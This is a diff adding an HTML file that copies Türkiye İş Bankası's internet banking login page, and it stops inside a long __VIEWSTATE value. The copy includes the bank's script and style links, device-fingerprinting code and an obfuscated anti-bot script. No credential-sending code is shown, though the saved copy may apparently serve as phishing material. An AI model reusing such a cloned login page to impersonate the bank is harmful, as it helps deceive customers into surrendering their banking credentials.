@@ -1,0 +1,654 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="Content-Type" content="text/html;charset=iso-8859-9;" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <title>Türkiye İş Bankası İnternet Şubesi</title>
+    <script type="text/javascript">
+        function mobilkontrol() {
+            if (navigator.userAgent.match(/iPhone/i)
+                || navigator.userAgent.match(/iPad/i)
+                || navigator.userAgent.match(/iPod/i)
+            ) {
+                return true;
+            }
+            else {
+                return false;
+            }
+        }
+
+        if (mobilkontrol() == true) {
+            document.title = 'İnternet Şubesi';
+        }
+    </script>
+
+    <meta content="" name="description" />
+    <meta content="" name="keywords" />
+    <meta name="robots" content="noindex,nofollow" />
+    <meta name="format-detection" content="telephone=no" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    <meta name="theme-color" content="#08335E">
+    <meta name="msapplication-TileColor" content="#08335E">
+    <meta name="msapplication-navbutton-color" content="#08335E">
+    <meta name="apple-mobile-web-app-status-bar-style" content="#08335E">
+    <link rel="apple-touch-icon-precomposed" href="images_new/Genel/islogo_192.png">
+    <link rel="shortcut icon" sizes="192x192" href="images_new/Genel/islogo_192.png">
+
+    <script language="JavaScript" type="text/javascript"
+        src="https://www.isbank.com.tr/Internet/IntSubeJS/LanguageFiles/Messages_tr-TR.js?240408032319"></script>
+    <script language="JavaScript" type="text/javascript" src="ClientConfig.aspx?240408032312"></script>
+    <LINK type="text/css" rel="STYLESHEET"
+        href="https://www.isbank.com.tr/Internet/Omni/css_new/reset.css?2404080323" />
+    <LINK type="text/css" rel="STYLESHEET"
+        href="https://www.isbank.com.tr/Internet/Omni/css_new/vendor/jquery/jquery-ui-1.10.4.custom.css?2404080323" />
+    <LINK type="text/css" rel="STYLESHEET"
+        href="https://www.isbank.com.tr/Internet/Omni/css_new/vendor/jquery/keypad/jquery.keypad.css?2404080323" />
+    <LINK type="text/css" rel="STYLESHEET"
+        href="https://www.isbank.com.tr/Internet/Omni/css_new/vendor/jquery/select2/select2.css?2404080323" />
+    <LINK type="text/css" rel="STYLESHEET"
+        href="https://www.isbank.com.tr/Internet/Omni/css_new/vendor/jquery/nanoScroller/nanoScroller.css?2404080323" />
+    <LINK type="text/css" rel="STYLESHEET" href="https://www.isbank.com.tr/Internet/Omni/css_new/main.css?2404080323" />
+    <LINK type="text/css" rel="STYLESHEET"
+        href="https://www.isbank.com.tr/Internet/Omni/css_new/newLightbox.css?2404080323" />
+    <!--[if lte IE 10]>
+    <LINK  type="text/css" rel="STYLESHEET" href="https://www.isbank.com.tr/Internet/Omni/css_new/IE.css?2404080323"/>
+    <![endif]-->
+    <!--[if IE 9]>
+    <LINK  type="text/css" rel="STYLESHEET" href="https://www.isbank.com.tr/Internet/Omni/css_new/IE9.css?2404080323"/>
+    <![endif]-->
+    <!--[if lte IE 8]>
+    <LINK  type="text/css" rel="STYLESHEET" href="https://www.isbank.com.tr/Internet/Omni/css_new/ltIE9.css?2404080323"/>
+    <![endif]-->
+    <!--[if IE 7]>
+    <LINK  type="text/css" rel="STYLESHEET" href="https://www.isbank.com.tr/Internet/Omni/css_new/IE7.css?2404080323"/>
+    <![endif]-->
+    <LINK type="text/css" rel="STYLESHEET"
+        href="https://www.isbank.com.tr/Internet/Omni/css_new/mediaQuery/scale.css?2404080323" />
+    <LINK type="text/css" rel="STYLESHEET"
+        href="https://www.isbank.com.tr/Internet/Omni/css_new/mediaQuery/login.css?2404080323" />
+    <LINK type="text/css" rel="STYLESHEET"
+        href="https://www.isbank.com.tr/Internet/Omni/css_new/mediaQuery/sideBanner.css?2404080323" />
+    <LINK type="text/css" rel="STYLESHEET"
+        href="https://www.isbank.com.tr/Internet/Omni/css_new/mediaQuery/mobileHeader.css?2404080323" />
+    <script language="JavaScript" type="text/javascript"
+        src="https://www.isbank.com.tr/Internet/Omni/js/vendor/jquery/jquery-1.11.0.js?240408032326"></script>
+    <script language="JavaScript" type="text/javascript"
+        src="https://www.isbank.com.tr/Internet/Omni/js/app/touchDetection.js?240408032326"></script>
+    <script language="JavaScript" type="text/javascript"
+        src="https://www.isbank.com.tr/Internet/Omni/js/vendor/jquery/jquery-ui/jquery-ui-1.10.4.custom.js?240408032326"></script>
+    <script language="JavaScript" type="text/javascript"
+        src="https://www.isbank.com.tr/Internet/Omni/js/vendor/jquery/keypad/jquery.plugin.js?240408032326"></script>
+    <script language="JavaScript" type="text/javascript"
+        src="https://www.isbank.com.tr/Internet/Omni/js/vendor/jquery/keypad/jquery.keypad.js?240408032326"></script>
+    <script language="JavaScript" type="text/javascript"
+        src="https://www.isbank.com.tr/Internet/Omni/js/vendor/jquery/keypad/jquery.keypad-tr.js?240408032326"></script>
+    <script language="JavaScript" type="text/javascript"
+        src="https://www.isbank.com.tr/Internet/Omni/js/vendor/jquery/select2/select2.js?240408032326"></script>
+    <script language="JavaScript" type="text/javascript"
+        src="https://www.isbank.com.tr/Internet/Omni/js/vendor/jquery/nanoScroller/nanoScroller.js?240408032326"></script>
+    <script language="JavaScript" type="text/javascript"
+        src="https://www.isbank.com.tr/Internet/Omni/js/app/browserCheck.js?240408032325"></script>
+    <script language="JavaScript" type="text/javascript"
+        src="https://www.isbank.com.tr/Internet/Omni/js/app/app.js?240408032325"></script>
+    <script language="JavaScript" type="text/javascript" src="/js/iframenavigator.js?240408032222"></script>
+    <script language="JavaScript" type="text/javascript"
+        src="https://www.isbank.com.tr/Internet/IntSubeJS/Slash.js?240408032320"></script>
+    <script language="JavaScript" type="text/javascript" src="/js/alfa.js?240408032221"></script>
+    <script language="JavaScript" type="text/javascript" src="/js/commonNew.js?240408032221"></script>
+    <script language="JavaScript" type="text/javascript" src="/js/JEditSubmit.js?240408032221"></script>
+    <script language="JavaScript" type="text/javascript"
+        src="https://www.isbank.com.tr/Internet/IntSubeJS/lightboxOld.js?240408032321"></script>
+    <script language="JavaScript" type="text/javascript"
+        src="https://www.isbank.com.tr/Internet/IntSubeJS/IsJs/IsFwOperations/IsJsCookie.js?240408032317"></script>
+    <script language="JavaScript" type="text/javascript"
+        src="https://www.isbank.com.tr/Internet/IntSubeJS/IsJs/IsFwOperations/IsjsBrowser.js?240408032317"></script>
+
+    <script language="JavaScript" type="text/javascript" src="IntSubeJS/NewLightBox.js?240408032319"></script>
+    <script language="JavaScript" type="text/javascript"
+        src="https://www.isbank.com.tr/Internet/IntSubeJS/dfp.min.js?240408032321"></script>
+
+
+
+
+    <script language='javascript' src='IntSubeJS/KeydownHandler.js' type='text/javascript'></script>
+    <script
+        language=javascript>var eglvchathandle = null; function openHelp() { try { if (eglvchathandle != null && eglvchathandle.closed == false) { eglvchathandle.focus(); return; } } catch (err) { } var refererName = ""; refererName = encodeURIComponent(refererName); var refererurl = encodeURIComponent(document.location.href); var hashIndex = refererurl.lastIndexOf("#"); if (hashIndex != -1) { refererurl = refererurl.substring(0, hashIndex); } var eglvcaseid = (/eglvcaseid=[0-9]*/gi).exec(window.location.search); var vhtIds = ""; if (typeof EGAINCLOUD != "undefined" && EGAINCLOUD.Account.getAllIds) { var ids = EGAINCLOUD.Account.getAllIds(); vhtIds = "&aId=" + ids.a + "&sId=" + ids.s + "&uId=" + ids.u; } var eGainChatUrl = "https://www.isbank.com.tr/chat/system/templates/chat/isbank/chat.html?entryPointId=1001&templateName=isbank&languageCode=en&countryCode=US&ver=v11&eglvrefname=" + refererName + "&" + eglvcaseid + vhtIds; if ((eGainChatUrl + refererurl).length <= 2000) eGainChatUrl += "&referer=" + refererurl; var params = "height=60,width=440,resizable=no,scrollbars=no,toolbar=no"; eglvchathandle = window.open(eGainChatUrl, "", params) }</script>
+
+    <script type="text/javascript">
+        (function () {
+            try {
+                function getterHook(obj, name, cb) {
+                    if (document.__defineGetter__) {
+                        document.__defineGetter__(name, cb);
+                        return;
+                    }
+                    if ((obj && obj.prototype && Object) &&
+                        (Object.getOwnPropertyDescriptor) &&
+                        (Object.getOwnPropertyDescriptor(obj.prototype, name)) &&
+                        (Object.getOwnPropertyDescriptor(obj.prototype, name).get) &&
+                        (Object.getOwnPropertyDescriptor(obj.prototype, name).configurable)) {
+                        Object.defineProperty(obj.prototype, name, { get: cb });
+                        return;
+                    }
+                }
+                function asmReferrerGetter() { return ""; }
+                getterHook(Document, "referrer", asmReferrerGetter);
+            } catch (e) { }
+        })();
+
+    </script>
+
+    <script type="text/javascript">
+        (function () {
+            window["loaderConfig"] = "/TSPD/?type=20";
+        })();
+
+    </script>
+
+    <script type="text/javascript" src="/TSPD/?type=18"></script>
+
+    <APM_DO_NOT_TOUCH>
+
+        <script type="text/javascript">
+            (function () {
+                window.GWrG = !!window.GWrG; try {
+                    (function () {
+                        (function () {
+                            var s = -1, s = { ll: ++s, _I: "false"[s], l: ++s, Jz: "false"[s], Il: ++s, Zzl: "[object Object]"[s], Ss: (s[s] + "")[s], lZ: ++s, ss: "true"[s], zl: ++s, lL: ++s, iI: "[object Object]"[s], i: ++s, _L: ++s, _OL: ++s, SOL: ++s }; try {
+                                s.jz = (s.jz = s + "")[s.lL] + (s.jO = s.jz[s.l]) + (s.SI = (s.IO + "")[s.l]) + (!s + "")[s.lZ] + (s.JO = s.jz[s.i]) + (s.IO = "true"[s.l]) + (s.Is = "true"[s.Il]) + s.jz[s.lL] + s.JO + s.jO + s.IO, s.SI = s.IO + "true"[s.lZ] + s.JO + s.Is + s.IO + s.SI, s.IO = s.ll[s.jz][s.jz], s.IO(s.IO(s.SI + '"\\' + s.l + s.lL + s.l + s._I + "\\" + s.zl + s.ll + "(" + s.JO + "\\" + s.l + s._L +
+                                    s.l + "\\" + s.l + s.i + s.ll + s.ss + s.jO + s._I + "\\" + s.zl + s.ll + "\\" + s.l + s.i + s._L + "\\" + s.l + s.lL + s.l + "\\" + s.l + s.lL + s.i + s.Ss + s.jO + "\\" + s.l + s.i + s._L + "['\\" + s.l + s.i + s.ll + s.Jz + "\\" + s.l + s._L + s.l + "false"[s.Il] + s.jO + s.Jz + s.Ss + "']\\" + s.zl + s.ll + "===\\" + s.zl + s.ll + "'\\" + s.l + s.i + s.lZ + s.JO + "\\" + s.l + s.i + s.Il + "\\" + s.l + s.lL + s.l + "\\" + s.l + s.lL + s.i + "\\" + s.l + s.zl + s._L + "')\\" + s.zl + s.ll + "{\\" + s.l + s.Il + "\\" + s.l + s.l + "\\" + s.l + s.i + s.i + s.Jz + "\\" + s.l + s.i + s.Il + "\\" + s.zl + s.ll + s.ss + s.Ss + "\\" + s.l + s.i + s.i + s.iI + "\\" + s.l + s._L + s.l + s.Is + "\\" + s.l +
+                                    s.lL + s.Il + "\\" + s.l + s.lL + s.lZ + "\\" + s.l + s.i + s.ll + "\\" + s.zl + s.ll + "=\\" + s.zl + s.ll + "\\" + s.l + s.i + s._L + "\\" + s.l + s.lL + s.l + "\\" + s.l + s.lL + s.i + s.Ss + s.jO + "\\" + s.l + s.i + s._L + "['\\" + s.l + s.i + s.ll + s.Jz + "\\" + s.l + s._L + s.l + "false"[s.Il] + s.jO + s.Jz + s.Ss + "'].\\" + s.l + s.i + s.Il + s.ss + "\\" + s.l + s.i + s.ll + "false"[s.Il] + s.Jz + s.iI + s.ss + "(/.{" + s.l + "," + s.zl + "}/\\" + s.l + s.zl + s._L + ",\\" + s.zl + s.ll + s._I + s.Is + "\\" + s.l + s.lL + s.i + s.iI + s.JO + "\\" + s.l + s.lL + s.l + s.jO + "\\" + s.l + s.lL + s.i + "\\" + s.zl + s.ll + "(\\" + s.l + s._L + s.ll + ")\\" + s.zl + s.ll + "{\\" + s.l +
+                                    s.Il + "\\" + s.l + s.l + "\\" + s.l + s.l + "\\" + s.l + s.l + "\\" + s.l + s.i + s.Il + s.ss + s.JO + s.Is + "\\" + s.l + s.i + s.Il + "\\" + s.l + s.lL + s.i + "\\" + s.zl + s.ll + "(\\" + s.l + s._L + s.ll + "\\" + s.zl + s.ll + "+\\" + s.zl + s.ll + "\\" + s.l + s._L + s.ll + ").\\" + s.l + s.i + s.lZ + s.Is + s.Zzl + "\\" + s.l + s.i + s.lZ + s.JO + "\\" + s.l + s.i + s.Il + "(" + s.Il + ",\\" + s.zl + s.ll + s.zl + ")\\" + s.l + s.Il + "\\" + s.l + s.l + "\\" + s.l + s.l + "});\\" + s.l + s.Il + "}\\" + s.l + s.Il + '"')())()
+                            } catch (_) { s %= 5 }
+                        })(); var is = 58;
+                        try { var Is, ls, os = S(85) ? 1 : 0, Zs = S(545) ? 1 : 0, SS = S(227) ? 1 : 0, IS = S(651) ? 1 : 0, jS = S(474) ? 1 : 0, oS = S(212) ? 1 : 0, zS = S(936) ? 0 : 1, sI = S(321) ? 1 : 0; for (var ZS = (S(530), 0); ZS < ls; ++ZS)os += (S(549), 2), Zs += (S(699), 2), SS += S(180) ? 2 : 1, IS += (S(817), 2), jS += (S(304), 2), oS += S(517) ? 2 : 1, zS += S(474) ? 2 : 1, sI += (S(214), 3); Is = os + Zs + SS + IS + jS + oS + zS + sI; window._s === Is && (window._s = ++Is) } catch (S_) { window._s = Is } var __ = !0; function l(s) { var _ = arguments.length, J = [], O = 1; while (O < _) J[O - 1] = arguments[O++] - s; return String.fromCharCode.apply(String, J) }
+                        function j_(s) { var _ = 75; !s || document[I(_, 193, 180, 190, 180, 173, 180, 183, 180, 191, 196, 158, 191, 172, 191, 176)] && document[l(_, 193, 180, 190, 180, 173, 180, 183, 180, 191, 196, 158, 191, 172, 191, 176)] !== L(68616527591, _) || (__ = !1); return __ } function J_() { } j_(window[J_[L(1086796, is)]] === J_); j_(typeof ie9rgb4 !== L(1242178186141, is)); j_(RegExp("\x3c")[L(1372147, is)](function () { return "\x3c" }) & !RegExp(L(42831, is))[I(is, 174, 159, 173, 174)](function () { return "'x3'+'d';" }));
+                        var l_ = window[l(is, 155, 174, 174, 155, 157, 162, 127, 176, 159, 168, 174)] || RegExp(l(is, 167, 169, 156, 163, 182, 155, 168, 158, 172, 169, 163, 158), I(is, 163))[L(1372147, is)](window["\x6e\x61vi\x67a\x74\x6f\x72"]["\x75\x73e\x72A\x67\x65\x6et"]), o_ = +new Date + (S(138) ? 6E5 : 762382), O_, Si, _i, Ii = window[I(is, 173, 159, 174, 142, 163, 167, 159, 169, 175, 174)], ji = l_ ? S(591) ? 3E4 : 44454 : S(479) ? 6E3 : 5952;
+                        document[l(is, 155, 158, 158, 127, 176, 159, 168, 174, 134, 163, 173, 174, 159, 168, 159, 172)] && document[l(is, 155, 158, 158, 127, 176, 159, 168, 174, 134, 163, 173, 174, 159, 168, 159, 172)](I(is, 176, 163, 173, 163, 156, 163, 166, 163, 174, 179, 157, 162, 155, 168, 161, 159), function (s) {
+                            var _ = 27; document[l(_, 145, 132, 142, 132, 125, 132, 135, 132, 143, 148, 110, 143, 124, 143, 128)] && (document[I(_, 145, 132, 142, 132, 125, 132, 135, 132, 143, 148, 110, 143, 124, 143, 128)] === l(_, 131, 132, 127, 127, 128, 137) && s[I(_, 132, 142, 111, 141, 144, 142, 143, 128, 127)] ? _i = !0 : document[l(_, 145,
+                                132, 142, 132, 125, 132, 135, 132, 143, 148, 110, 143, 124, 143, 128)] === L(68616527639, _) && (O_ = +new Date, _i = !1, Ji()))
+                        }); function I(s) { var _ = arguments.length, J = []; for (var O = 1; O < _; ++O)J.push(arguments[O] - s); return String.fromCharCode.apply(String, J) } function Ji() { if (!document[I(2, 115, 119, 103, 116, 123, 85, 103, 110, 103, 101, 118, 113, 116)]) return !0; var s = +new Date; if (s > o_ && (S(446) ? 6E5 : 351528) > s - O_) return j_(!1); var _ = j_(Si && !_i && O_ + ji < s); O_ = s; Si || (Si = !0, Ii(function () { Si = !1 }, S(797) ? 1 : 0)); return _ } Ji();
+                        var li = [S(552) ? 17795081 : 22004036, S(447) ? 27611931586 : 2147483647, S(749) ? 1558153217 : 2147483647]; function L(s, _) { s += _; return s.toString(36) } function Li(s) { var _ = 45; s = typeof s === L(1743045631, _) ? s : s[I(_, 161, 156, 128, 161, 159, 150, 155, 148)](S(784) ? 36 : 23); var J = window[s]; if (!J || !J[l(_, 161, 156, 128, 161, 159, 150, 155, 148)]) return; var O = "" + J; window[s] = function (s, _) { Si = !1; return J(s, _) }; window[s][I(_, 161, 156, 128, 161, 159, 150, 155, 148)] = function () { return O } } for (var oi = (S(902), 0); oi < li[L(1294399147, is)]; ++oi)Li(li[oi]);
+                        j_(!1 !== window[l(is, 129, 145, 172, 129)]); window.iZ = window.iZ || {}; window.iZ.IOL = "0872a4d44f16e8009091ec81ff1557e9cdf5c90cc9feaec63b089c79d8010e5af1871974ebf2fedeb721ac8fce5ae4dc943581aa706589ccaa45eb9c62100a75e4e0af55e8a0ff182a9e16b6370e19e525002beb1c88f5997b8f25447b00bcfe303628bfb5e8341919ff674585bd6c0366874638bfda4b0634c44cc769bf34ef86782d5ba266d2839ae674f48689673acb7b0898267563fcbb909addb424159c3ebbaae64865dab716e70f2a0dcb75144c377d229df1c8b83cac222f5e62b72868c7033c7ce91c4a06485b8fd887ef61e8b7665f42fc7efb4475b69d77f65ae4bdaffbce3d2e4151009d16ecda688724"; function Zi(s) { var _ = +new Date, J; !document[I(4, 117, 121, 105, 118, 125, 87, 105, 112, 105, 103, 120, 115, 118, 69, 112, 112)] || _ > o_ && (S(184) ? 6E5 : 472664) > _ - O_ ? J = j_(!1) : (J = j_(Si && !_i && O_ + ji < _), O_ = _, Si || (Si = !0, Ii(function () { Si = !1 }, S(355) ? 1 : 0))); return !(arguments[s] ^ J) } function S(s) { return 870 > s } (function (s) { s || setTimeout(function () { var s = setTimeout(function () { }, 250); for (var J = 0; J <= s; ++J)clearTimeout(J) }, 500) })(!0);
+                    })();
+                } catch (x) { } finally { ie9rgb4 = void (0); }; function ie9rgb4(a, b) { return a >> b >> 0 };
+
+            })();
+
+        </script>
+    </APM_DO_NOT_TOUCH>
+
+    <script type="text/javascript"
+        src="/TSPD/0859940f4bab2000d2b465edbea161499f630f0292d5bed1f67d2492f120ac0923d56fc59457a69f?type=17"></script>
+    <style>
+        .error {
+            color: red;
+        }
+    </style>
+</head>
+
+<body>
+
+
+
+
+    <script type="text/javascript">
+        var decidePopupHeightAndWidth = function (maxWidth, maxHeight) {
+
+            var resolution = {};
+
+            if (window.screen.availWidth >= maxWidth) {
+                resolution["width"] = maxWidth;
+            } else {
+                resolution["width"] = window.screen.availWidth;
+            }
+
+            if (window.screen.availHeight >= maxHeight) {
+                resolution["height"] = maxHeight;
+            } else {
+                resolution["height"] = window.screen.availHeight;
+            }
+
+            return resolution;
+        };
+
+        function disabledCookieDetected() {
+            if ($("#loginErrorContainer")) {
+                $('#img_errorSymbol').attr("src", "omni/assets/img/updateImg1.png");
+                $('#loginErrorContainer').addClass('cookieDisabled');
+                $("#loginErrorContainer").show();
+                $("#_ctl0_MusNoText").prop("readonly", true);
+                $("#ParolaText").prop("readonly", true);
+                $("#_ctl0_SubeLogin01_btnGiris").hide();
+            }
+        }
+
+
+        async function getFingerprint() {
+            var chomarEndpoint = $('#l_ChomarEndpoint').val();
+            var chomarAppId = $('#l_ChomarAppId').val();
+            var chomarUseTlsFingerprint = $('#l_ChomarUseTlsFingerprint').val();
+            var chomarSslFpUrl = $('#l_ChomarSslFpUrl').val();
+            window.ChomarFingerPrint.setUrl(chomarEndpoint);
+            window.ChomarFingerPrint.setAppId(chomarAppId);
+            if (chomarUseTlsFingerprint == 'true') {
+                window.ChomarFingerPrint.useTlsFingerprint(true);
+                window.ChomarFingerPrint.setSslfpUrl(chomarSslFpUrl);
+            }
+            else {
+                window.ChomarFingerPrint.useTlsFingerprint(false);
+            }
+            await window.ChomarFingerPrint.getFingerprint().then(
+                function onSuccess(response) {
+                    window.ChomarFingerPrint.devicesRequest();
+                    $('#l_ChomarFp').val(response);
+                    ChommarFP = response;
+                });
+
+
+        }
+
+
+        $(document).ready(function () {
+            if ($('#l_chomarActive').val() == "true") {
+                getFingerprint();
+            }
+
+            if (isjsBrowser.GetBrowserVersion() == '10.0' && (isjsBrowser.GetBrowserName() == 'MSIE')) { //IE-10 CapsLock Warning disabled - GD
+                document.msCapsLockWarningOff = true;
+            }
+            if (isjsBrowser.GetBrowserVersion().indexOf("rv:11.0") > 0 && (isjsBrowser.GetBrowserName() == 'Netscape')) {
+                document.msCapsLockWarningOff = true;
+            }
+
+            if (document.getElementById("_ctl0_MusNoText") && document.getElementById("resizeStatus") && document.getElementById("resizeStatus").value == "0") {
+                window.moveTo(0, 0);
+                resolution = decidePopupHeightAndWidth(1392, 1080);
+                window.resizeTo(resolution["width"], resolution["height"]);
+                if (window.navigator.userAgent.indexOf("Edge") > -1)
+                    window.resizeTo(1100, 800);
+                document.getElementById("resizeStatus").value = "1";
+            }
+            if (navigator.cookieEnabled == false) {
+
+                disabledCookieDetected();
+            }
+
+        });
+
+
+
+        function SetSubmittedValueForSessionControl() {
+            if (document.forms[0].FormSubmitted)
+                document.forms[0].FormSubmitted.value = 'true';
+            if (window.parent.document.forms[0].FormSubmitted) {
+                window.parent.document.forms[0].FormSubmitted.value = 'true';
+            }
+
+        }
+
+
+
+    </script>
+    <noscript>
+        <div style="position: absolute; height: 800px; left: 0; top: 0; width: 100%; z-index: 850">
+            <iframe id="JsDisabledFrame" name="JsDisabledFrame" height="100%" width="100%" scrolling="no"
+                src="https://www.isbank.com.tr/UserFiles/htmls/js_deaktif/z5-z6-hata1.html"></iframe>
+        </div>
+    </noscript>
+    <input type="hidden" name="isTabletApp" id="isTabletApp" value="false" />
+    <input type="hidden" name="osType" id="osType" value="false" />
+    <input type="hidden" name="rsamodulus" id="rsamodulus"
+        value="A607708F11403CE77B015BF31A99469BDDDB460B7EDC8146AFA2AB33F69EF0DFB20F930B44C2C2946DD06A398BA6B2EC67426272D4A706114D880B30C496E5186C90AAC56E3DE8989295FB513E58675FE88431AEC2F52AF7F744CA1332DC39B20166DEEC6E3DC6BC2307D2CB71B84973FC9C260C6AF49A58B6926600612B0BC921E6AEEE1C6CFD279954B007DA19E3C36EDCE08F69A8FD572182995E1618E411906F0C0679561C7B9A48A43A00BB435CFF5A46A79061E6E29C644144E74E2B23F31E0ABF54FCAAA42864A2B6578AD81029AFCEC25AB9802056E7A137F3563D981E160A50C463E0A32602569CA810E58995E237ED8D96294614F5FB7CB8B0890D" />
+    <input type="hidden" name="rsaexponent" id="rsaexponent" value="010001" />
+    <input type="hidden" name="encstr" id="encstr" value="" />
+    <input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE"
+        value="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